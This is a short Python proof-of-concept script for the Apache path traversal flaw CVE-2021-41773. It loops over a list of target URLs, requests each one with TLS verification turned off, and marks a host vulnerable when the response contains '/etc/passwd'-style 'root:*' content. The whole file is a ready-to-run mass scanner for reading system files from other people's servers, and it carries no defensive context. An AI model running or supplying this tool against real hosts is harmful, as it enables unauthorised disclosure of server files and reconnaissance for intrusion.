#!/usr/bin/env python3
# CVE-2021-41773-PoC 
# ZephrFish 2021

import urllib3
import sys
import re
import requests


urllib3.disable_warnings()
# Colours
def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))


def CVEPoC(urls):
    with open(urls.rstrip(), 'r') as f:
                for url in f:
                                HTTPSecure = "https://"+url.rstrip()
                                HTTPNot = "http://"+url.rstrip()
                                try:
                                        httpsresponse = requests.get(HTTPSecure, verify=False, timeout=8)
                                        httpresponse = requests.get(HTTPNot, verify=False, timeout=8)

                                        if 'root:*' in httpsresponse.text:
                                                prRed('[+] Vulnerable: ' + url)
                                        elif 'root:*' in httpresponse.text:
                                                prRed('[+] Vulnerable: ' + url)
                                        else:
                                                prGreen('[-] Not Vulnerable: ' + url)

                                except:
                                        pass
            


if __name__ == '__main__':
        try:
                CVEPoC(sys.argv[1])
        except:
                print("Usage: python3 poc.py <urls.txt>")
